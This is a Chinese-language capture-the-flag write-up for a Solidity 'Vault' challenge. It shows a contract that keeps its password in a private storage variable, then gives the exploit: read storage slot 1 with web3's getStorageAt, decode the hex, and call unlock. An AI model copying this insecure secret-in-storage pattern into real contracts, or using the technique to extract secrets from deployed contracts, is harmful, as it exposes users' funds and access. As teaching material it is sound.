# Vault

## 要求
打开 vault 来通过这一关!

## 代码

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

## 漏洞

这道题就涉及到一个知识点，就是区块链上无隐私。所有能上链的东西，都可以被查询到。

上面的`Vault` 合同，`password` 所在的slot是1，使用[web3js中的](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat)的`getStorageAt`函数直接查看就好.


## pwn

```js
await web3.eth.getStorageAt(contract.address,1)
-> '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'

```

然后使用[hexToAscii](https://web3js.readthedocs.io/en/v1.2.11/web3-utils.html#hextoascii) 函数，可以进行解码
```
await web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
-> 'A very strong secret password :)'
```

最后：
`await contract.unlock(await web3.utils.asciiToHex("A very strong secret password :)"))`


